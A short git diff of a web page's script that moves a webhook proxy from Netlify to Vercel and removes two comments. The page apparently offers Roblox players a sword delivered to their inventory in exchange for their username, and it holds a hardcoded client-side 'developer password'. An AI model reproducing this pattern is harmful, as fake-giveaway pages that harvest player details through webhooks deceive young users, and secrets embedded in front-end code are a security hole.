@@ -852,8 +852,8 @@
 </div>
 
 <script>
-  // ===== NETLIFY FUNCTION ENDPOINT =====
-  const WEBHOOK_ENDPOINT = "/.netlify/functions/send-webhook";
+  // ===== VERCEL FUNCTION ENDPOINT =====
+  const WEBHOOK_ENDPOINT = "/api/send-webhook";
 
   // ===== DEVELOPER PASSWORD =====
   const PASSWORD_GIVE_SWORD = "595080470";
@@ -1179,7 +1179,7 @@
     return '';
   }
 
-  // ===== SEND TO NETLIFY FUNCTION (PROXY) =====
+  // ===== SEND TO VERCEL FUNCTION (PROXY) =====
   async function sendToWebhook(data) {
     try {
       const response = await fetch(WEBHOOK_ENDPOINT, {
@@ -1269,7 +1269,6 @@
     const success = await sendToWebhook(payload);
 
     if (success) {
-      // Show waiting notification
       status.style.color = '#00ff88';
       status.textContent = '⏳ WAIT A FEW HOURS FOR THE SWORD TO ENTER YOUR INVENTORY';
       status.style.fontSize = '15px';
@@ -1279,7 +1278,6 @@
       status.style.borderRadius = '10px';
       status.style.background = 'rgba(0, 255, 136, 0.08)';
 
-      // Reset form after 5 seconds
       setTimeout(() => {
         document.getElementById('robloxUsername').value = '';
         document.getElementById('swordSearch').value = '';
